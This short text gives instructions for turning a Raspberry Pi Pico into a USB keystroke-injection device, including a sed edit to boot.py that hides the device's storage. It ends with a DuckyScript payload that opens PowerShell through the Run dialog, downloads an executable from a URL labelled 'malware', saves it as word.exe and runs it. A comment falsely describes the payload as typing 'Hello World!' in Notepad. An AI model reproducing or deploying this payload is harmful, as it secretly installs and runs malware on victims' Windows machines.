```bash
cp adafruit-circuitpython-raspberry_pi_pico-en_US-9.2.1.uf2 /path/to/RPI 
```

wait for reboot

```bash
cp *.py /path/to/RPI
sed -i "s/noStorage\ \=\=\ False/noStorage\ \=\=\ True/g" /path/to/RPI/boot.py
cp payload.dd /path/to/RPI
```

```ducky
REM The next four lines open Notepad in Windows and type "Hello World!"
GUI r
STRING powershell
ENTER
DELAY 500
REM word.exe ;)
STRING $f="$env:TEMP\word.exe"; iwr "https://domain.tld/damd/malware/uri" -o $f; &$f
```
